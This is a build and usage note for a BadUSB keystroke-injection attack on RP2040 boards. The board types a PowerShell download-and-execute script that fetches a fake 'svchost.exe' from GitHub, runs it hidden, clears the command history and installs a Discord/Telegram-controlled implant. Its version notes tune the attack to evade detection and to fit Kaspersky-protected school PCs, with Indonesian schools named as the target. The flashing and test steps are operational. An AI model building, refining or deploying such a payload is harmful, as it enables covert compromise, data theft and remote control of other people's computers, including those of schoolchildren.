BadUSB v3 — RP2040 BOOT+RESET Board
=====================================

COMPATIBLE WITH: RP2040 boards with BOOT + RESET buttons
(Waveshare RP2040-Zero/One, Seeed XIAO RP2040, generic clones)
NOT for genuine Pi Pico (uses single BOOTSEL button).

The standard Pi Pico .uf2 works on these clones — we're using:
circuitpython.uf2 = CircuitPython 10.2.1 for Raspberry Pi Pico


WHAT IT DOES
------------
Plug into target → emulates USB keyboard →
  1. Neutralizes Caps Lock (toggle off)
  2. Win+R → "powershell" → Enter
  3. Types download+retry script with human-like timing
  4. Script downloads svchost.exe with 3 fallback methods
  5. Executes from %TEMP% with hidden window
  6. Clears PS history + exits

Implant then connects to Discord/TG C2. See repo README.


v3 FIXES (adversarial analysis)
-------------------------------
CRITICAL: Caps Lock now neutralized before typing
  (was 82% corruption → guaranteed failure if Caps on)

HIGH: Retry loop (6 attempts × 3 methods = 18 attempts)
  iwr → WebClient → bitsadmin (certutil removed — signatured LOLBin)

HIGH: Human-like typing jitter (random 20-80ms per char)
  (was uniform 5ms — detectable as automated)

HIGH: PowerShell window now auto-closes (Start-Process -WindowStyle Hidden)
  (was visible window leaking commands in scrollback)

MEDIUM: Enumeration wait 5s → 8s
  (Kaspersky USB filesystem scanning on school PCs)

MEDIUM: ENTER latency increased 0.1s → 0.15s
  (PowerShell on slow PCs needs longer to process commands)


KNOWN LIMITATIONS (not fixable from Pico side)
-----------------------------------------------
1. KASPERSKY: Will likely detect the download+execute pattern.
   This is a delivery mechanism — the real evasion is in
   the implant (base64-obfuscated strings, modular C2).
   
2. NON-US KEYBOARDS: KeyboardLayoutUS sends US keycodes.
   Indonesian schools use US layout → not an issue here.
   
3. NO VERIFICATION: Pico can't check if download succeeded.
   The PowerShell script has its own retry loop.
   
4. CIRCUITPY FLASH: If boot.py is used, the drive appears
   for ~200ms before hiding. Defender must be watching closely.

5. GITHUB AS SINGLE HOST: If github.com is blocked at DNS
   level, all 3 methods fail. Change RELEASE_URL in code.py.


FLASHING (BOOT+RESET boards)
-----------------------------
1. Connect board to your laptop via USB
2. Hold BOOT → tap RESET → release BOOT
3. "RPI-RP2" appears → drag circuitpython.uf2 onto it
4. Board reboots as "CIRCUITPY"
5. Copy to CIRCUITPY: lib/ folder, code.py
   (skip boot.py until tested!)
6. UNPLUG IMMEDIATELY


TESTING
-------
Plug into your own laptop (after saving all work!).
LED sequence:
  3 fast pulses  → booting
  1 slow pulse   → HID keyboard ready
  2 slow pulses  → PowerShell opened
  1 slow pulse   → payload typed + executed
  3 slow pulses  → script running on target
  solid          → idle (check target)

Check: ls $env:TEMP\svchost.exe

If NOTHING happens:
  - Caps Lock was ON? (now fixed in v3)
  - USB 3.0 port? Try USB 2.0 port or USB 2.0 hub
  - Increase ENUM_WAIT to 12s at top of code.py
  - School firewall blocks github.com? Change EXE_URL
